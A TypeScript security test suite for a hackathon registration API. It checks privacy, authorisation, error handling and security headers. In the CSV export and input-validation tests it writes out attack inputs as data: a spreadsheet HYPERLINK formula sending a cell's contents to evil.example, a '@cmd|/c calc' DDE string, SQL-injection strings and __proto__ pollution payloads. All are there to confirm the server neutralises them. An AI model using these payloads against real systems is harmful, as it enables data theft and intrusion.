import assert from 'node:assert/strict';
import { after, before, describe, test } from 'node:test';
import {
  assertCleanError,
  endPool,
  pool,
  resetDb,
  seedProject,
  seedUser,
  setPhase,
  startApp,
  type TestApp,
} from './helpers.js';

const SECRET_DIETS = ['DIET-SENTINEL-halal-no-pork', 'DIET-SENTINEL-severe-peanut'];
const SECRET_MAJORS = ['MAJOR-SENTINEL-Astrobiology', 'MAJOR-SENTINEL-Linguistics'];
const EMAILS = ['alice.leaktest@kenyon.edu', 'bob.leaktest@denison.edu', 'carol.leaktest@oberlin.edu'];

let app: TestApp;
let ids: { alice: number; bob: number; carol: number };
let clients: Awaited<ReturnType<typeof seedUser>>['client'][];
let projA: number;
let projB: number;

before(async () => {
  await resetDb();
  app = await startApp();
  const alice = await seedUser(app, {
    name: 'Alice Leak',
    email: EMAILS[0],
    diet: SECRET_DIETS[0],
    major: SECRET_MAJORS[0],
    skills: ['Embedded C', 'Audio'],
    verified: true,
  });
  const bob = await seedUser(app, {
    name: 'Bob Leak',
    email: EMAILS[1],
    diet: SECRET_DIETS[1],
    major: SECRET_MAJORS[1],
    skills: ['Field research'],
    college: 'Denison University',
  });
  const carol = await seedUser(app, { name: 'Carol Leak', email: EMAILS[2], college: 'Oberlin College', verified: true });
  ids = { alice: alice.id, bob: bob.id, carol: carol.id };
  clients = [alice.client, bob.client, carol.client];
  projA = await seedProject({ title: 'Project A', members: [alice.id, bob.id], cap: 4 });
  projB = await seedProject({ title: 'Project B', members: [carol.id], cap: 3 });
  // A ballot exists in the DB (inserted directly so state checks cover every phase).
  await pool().query('INSERT INTO ballots (user_id) VALUES ($1)', [carol.id]);
  await pool().query('INSERT INTO ballot_votes (user_id, project_id) VALUES ($1, $2)', [carol.id, projA]);
});

after(async () => {
  await app.close();
  await endPool();
});

describe('GET /api/state never leaks private data', () => {
  for (const phase of ['reg', 'build', 'vote', 'result'] as const) {
    test(`phase=${phase}`, async () => {
      await setPhase(phase);
      for (const c of [app.client(), clients[0]!, await app.admin()]) {
        const r = await c.get('/api/state');
        assert.equal(r.status, 200);
        assert.equal(r.headers.get('cache-control'), 'no-store');
        const raw = r.text;
        for (const s of [...EMAILS, ...SECRET_DIETS, ...SECRET_MAJORS, '@', 'Embedded C', 'Field research', 'Audio']) {
          assert.ok(!raw.includes(s), `state leaks "${s}" in phase ${phase}`);
        }
        const rawNoPhase = JSON.stringify({ ...JSON.parse(raw), phase: undefined }).toLowerCase();
        for (const k of ['email', 'diet', 'skills', 'major', 'verified', 'vote', 'ballot', 'userId', 'user_id', 'created_by', 'createdBy', 'wants']) {
          assert.ok(!rawNoPhase.includes(k.toLowerCase()), `state contains key-ish "${k}" in phase ${phase}`);
        }
        const s = r.json;
        assert.deepEqual(Object.keys(s).sort(), ['equipment', 'phase', 'projects', 'stats']);
        assert.equal(s.phase, phase);
        assert.deepEqual(Object.keys(s.stats).sort(), ['colleges', 'seats', 'students', 'teams']);
        assert.deepEqual(s.stats, { students: 3, teams: 2, colleges: 3, seats: 4 - 2 + (3 - 1) });
        for (const p of s.projects) {
          assert.deepEqual(Object.keys(p).sort(), ['blurb', 'cap', 'code', 'fields', 'id', 'members', 'need', 'title']);
          for (const m of p.members) assert.deepEqual(Object.keys(m).sort(), ['college', 'name']);
        }
        for (const e of s.equipment) assert.deepEqual(Object.keys(e).sort(), ['available', 'key', 'name', 'stock']);
        // No member user ids anywhere: ids of members must not appear as values named id outside projects.
        assert.deepEqual(
          s.projects.map((p: { id: number }) => p.id),
          [projB, projA],
          'projects newest first',
        );
      }
    });
  }
});

describe('GET /api/results', () => {
  for (const phase of ['reg', 'build', 'vote'] as const) {
    test(`403 in phase ${phase} (even for admin)`, async () => {
      await setPhase(phase);
      for (const c of [app.client(), clients[2]!, await app.admin()]) {
        const r = await c.get('/api/results');
        assert.equal(r.status, 403);
        assertCleanError(r);
        assert.ok(!r.text.includes('votes'));
      }
    });
  }
  test('in result phase returns counts only, no voter identities', async () => {
    await setPhase('result');
    const r = await app.client().get('/api/results');
    assert.equal(r.status, 200);
    for (const s of [...EMAILS, 'Carol', 'Alice', 'Bob', ...SECRET_DIETS]) assert.ok(!r.text.includes(s), `results leak ${s}`);
    for (const row of r.json) assert.deepEqual(Object.keys(row).sort(), ['code', 'fields', 'id', 'memberCount', 'title', 'votes']);
  });
});

describe('GET /api/me', () => {
  test('anonymous gets user:null', async () => {
    const r = await app.client().get('/api/me');
    assert.equal(r.status, 200);
    assert.equal(r.json.user, null);
    assert.equal(r.json.isAdmin, false);
  });
  test('each user sees only their own data', async () => {
    await setPhase('reg');
    const r = await clients[0]!.get('/api/me');
    assert.equal(r.json.user.email, EMAILS[0]);
    assert.equal(r.json.user.major, SECRET_MAJORS[0]);
    for (const s of [EMAILS[1]!, EMAILS[2]!, SECRET_DIETS[1]!, SECRET_MAJORS[1]!]) assert.ok(!r.text.includes(s));
    // Own diet is not needed by the UI and is not returned either.
    assert.ok(!r.text.includes(SECRET_DIETS[0]!));
    assert.ok(!('id' in r.json.user), 'internal user id should not be exposed');
    const c = await clients[2]!.get('/api/me');
    assert.equal(c.json.user.hasVoted, true);
    assert.deepEqual(c.json.user.votes, [projA]);
    const b = await clients[1]!.get('/api/me');
    assert.equal(b.json.user.hasVoted, false);
    assert.deepEqual(b.json.user.votes, []);
    assert.equal(b.json.user.email, EMAILS[1]);
  });
  test('a forged / garbage session cookie is treated as anonymous', async () => {
    const c = app.client();
    c.jar.set('f5_session', 'A'.repeat(43));
    assert.equal((await c.get('/api/me')).json.user, null);
    c.jar.set('f5_session', "' OR 1=1 --");
    assert.equal((await c.get('/api/me')).json.user, null);
  });
  test('admin session cookie cannot be used as a user session and vice versa', async () => {
    const admin = await app.admin();
    const token = admin.jar.get('f5_admin')!;
    const c = app.client();
    c.jar.set('f5_session', token);
    const r = await c.get('/api/me');
    assert.equal(r.json.user, null);
    assert.equal(r.json.isAdmin, false);
    const u = app.client();
    u.jar.set('f5_admin', clients[0]!.jar.get('f5_session')!);
    assert.equal((await u.get('/api/admin/requests')).status, 401);
  });
});

describe('admin endpoints require an admin session', () => {
  const endpoints: [string, string, unknown?][] = [
    ['GET', '/api/admin/requests'],
    ['GET', '/api/admin/registrations.csv'],
    ['PUT', '/api/admin/phase', { phase: 'result' }],
    ['POST', '/api/admin/requests/1/return', {}],
    ['GET', '/api/admin/whatever'],
  ];
  for (const [method, path, body] of endpoints) {
    test(`${method} ${path}`, async () => {
      await setPhase('reg');
      for (const c of [app.client(), clients[0]!]) {
        const r = await c.req(method, path, body);
        assert.ok(r.status === 401 || r.status === 403, `${method} ${path} -> ${r.status}`);
        assertCleanError(r);
        for (const s of [...EMAILS, ...SECRET_DIETS]) assert.ok(!r.text.includes(s));
      }
      const phase = await pool().query('SELECT phase FROM settings');
      assert.equal(phase.rows[0].phase, 'reg', 'phase must not change');
    });
  }
});

describe('CSV export', () => {
  test('formula injection is neutralised and every cell quoted', async () => {
    const evil = await seedUser(app, {
      name: '=HYPERLINK("http://evil.example/?x="&A1,"click")',
      email: 'evil.csv@kenyon.edu',
      major: '+SUM(1,2)',
      diet: '@cmd|/c calc',
    });
    await seedUser(app, { name: '-2+3', email: 'minus.csv@kenyon.edu', diet: 'say "hi"' });
    const admin = await app.admin();
    const r = await admin.get('/api/admin/registrations.csv');
    assert.equal(r.status, 200);
    assert.match(r.headers.get('content-disposition') ?? '', /^attachment;/);
    assert.match(r.headers.get('content-type') ?? '', /text\/csv/);
    assert.equal(r.headers.get('cache-control'), 'no-store');
    const lines = r.text.replace(/^﻿/, '').trimEnd().split('\r\n');
    const evilLine = lines.find((l) => l.includes('evil.csv@'))!;
    assert.ok(evilLine.startsWith(`"'=HYPERLINK(""http://evil.example/?x=""&A1,""click"")"`), evilLine);
    assert.ok(evilLine.includes(`"'+SUM(1,2)"`));
    assert.ok(evilLine.includes(`"'@cmd|/c calc"`));
    const minus = lines.find((l) => l.includes('minus.csv@'))!;
    assert.ok(minus.startsWith(`"'-2+3"`));
    assert.ok(minus.includes(`"say ""hi"""`));
    // Every cell quoted: each line is a sequence of "..." separated by commas.
    for (const l of lines) assert.match(l, /^"(?:[^"]|"")*"(?:,"(?:[^"]|"")*")*$/, l);
    assert.ok(evil.id > 0);
  });
});

describe('error responses do not leak internals', () => {
  test('malformed JSON', async () => {
    const r = await clients[0]!.post('/api/projects', undefined, { raw: '{"title": "x",' });
    assert.equal(r.status, 400);
    assertCleanError(r);
  });
  test('huge body -> 413', async () => {
    const r = await app.client().post('/api/register', { name: 'x'.repeat(40_000) });
    assert.equal(r.status, 413);
    assertCleanError(r);
  });
  test('unsupported charset', async () => {
    const r = await app.client().post('/api/auth/link', { email: 'a@b.edu' }, { contentType: 'application/json; charset=iso-8859-1' });
    assert.ok(r.status >= 400 && r.status < 500, String(r.status));
    assertCleanError(r);
  });
  test('JSON null / array / string bodies', async () => {
    for (const raw of ['null', '[]', '"hello"', '123', '[1,2,3]']) {
      const r = await app.client().post('/api/auth/link', undefined, { raw });
      assert.equal(r.status, 400, `${raw} -> ${r.status}`);
      assertCleanError(r);
    }
  });
  test('wrong types and extra keys', async () => {
    await setPhase('reg');
    const cases: [string, unknown][] = [
      ['/api/register', { name: 123, email: [], college: {}, aiPolicy: 'yes', waiver: 1 }],
      ['/api/register', { name: 'A', email: 'a@b.edu', college: 'Kenyon College', aiPolicy: true, waiver: true, isAdmin: true }],
      ['/api/auth/link', { email: { $ne: null } }],
      ['/api/auth/link', { email: 'a@b.edu', extra: 1 }],
      ['/api/auth/redeem', { token: ['x'] }],
      ['/api/auth/redeem', { token: "' OR '1'='1" }],
      ['/api/admin/login', { password: 12345 }],
      ['/api/admin/login', { password: 'x'.repeat(5000) }],
    ];
    for (const [path, body] of cases) {
      const r = await app.client().post(path, body);
      assert.equal(r.status, 400, `${path} ${JSON.stringify(body).slice(0, 60)} -> ${r.status} ${r.text}`);
      assertCleanError(r);
    }
  });
  test('wrong types / extra keys on authenticated endpoints', async () => {
    await setPhase('reg');
    const u = await seedUser(app);
    const cases: [string, unknown][] = [
      ['/api/projects', { title: 'T', blurb: 'B', fields: ['cs', 'bio'], cap: 3, owner: 1 }],
      ['/api/projects', { title: ['T'], blurb: 'B', fields: 'cs,bio', cap: 'many' }],
      ['/api/projects', { title: 'T', blurb: 'B', fields: ['cs', 'bio'], cap: 1e308 }],
      ['/api/equipment/requests', { items: { led: '1' } }],
      ['/api/equipment/requests', { items: { led: 1.5 } }],
      ['/api/equipment/requests', { items: { led: -1 } }],
      ['/api/equipment/requests', { items: { led: 1 }, projectId: 1 }],
      ['/api/projects/1/join', { force: true }],
    ];
    for (const [path, body] of cases) {
      const r = await u.client.post(path, body);
      assert.ok(r.status === 400 || r.status === 403 || r.status === 404, `${path} ${JSON.stringify(body)} -> ${r.status} ${r.text}`);
      assertCleanError(r);
    }
  });
  test('prototype-pollution-ish keys do not crash the server', async () => {
    await setPhase('reg');
    const u = await seedUser(app);
    await seedProject({ members: [u.id] });
    for (const raw of [
      '{"items":{"__proto__":{"x":1}}}',
      '{"items":{"__proto__":1}}',
      '{"items":{"constructor":1}}',
      '{"items":{"__proto__":1,"led":1}}',
      '{"__proto__":{"isAdmin":true},"items":{"led":1}}',
    ]) {
      const r = await u.client.post('/api/equipment/requests', undefined, { raw });
      assert.ok(r.status < 500, `${raw} -> ${r.status} ${r.text}`);
      if (r.status >= 400) assertCleanError(r);
    }
    const r = await u.client.post('/api/ballot', { projectIds: [1e20] });
    assert.ok(r.status < 500, `huge id -> ${r.status}`);
  });
  test('bad route params', async () => {
    const u = await seedUser(app);
    for (const p of ['abc', '-1', '0', '1e3', '99999999999999999999', '1%20OR%201=1']) {
      const r = await u.client.post(`/api/projects/${p}/join`, {});
      assert.ok(r.status === 404 || r.status === 400, `${p} -> ${r.status}`);
      assertCleanError(r);
    }
  });
  test('unknown API route -> JSON 404, no-store', async () => {
    const r = await app.client().get('/api/does-not-exist');
    assert.equal(r.status, 404);
    assertCleanError(r);
    assert.equal(r.headers.get('cache-control'), 'no-store');
  });
  test('health exposes nothing else', async () => {
    const r = await app.client().get('/api/health');
    assert.deepEqual(r.json, { ok: true });
  });
  test('no x-powered-by, CSP applied to API responses', async () => {
    const r = await app.client().get('/api/state');
    assert.equal(r.headers.get('x-powered-by'), null);
    const csp = r.headers.get('content-security-policy') ?? '';
    for (const d of [
      "default-src 'self'",
      "script-src 'self'",
      "style-src 'self'",
      "img-src 'self' data:",
      "font-src 'self'",
      "connect-src 'self'",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
      "object-src 'none'",
    ]) {
      assert.ok(csp.includes(d), `CSP missing ${d}: ${csp}`);
    }
    assert.ok(!csp.includes('unsafe'), csp);
    assert.equal(r.headers.get('referrer-policy'), 'no-referrer');
    assert.equal(r.headers.get('strict-transport-security'), null, 'no HSTS in dev');
  });
  test('ids of individual users never appear in admin requests output either (only names)', async () => {
    const admin = await app.admin();
    const r = await admin.get('/api/admin/requests');
    assert.equal(r.status, 200);
    for (const s of EMAILS) assert.ok(!r.text.includes(s));
    assert.ok(ids.alice > 0);
  });
});
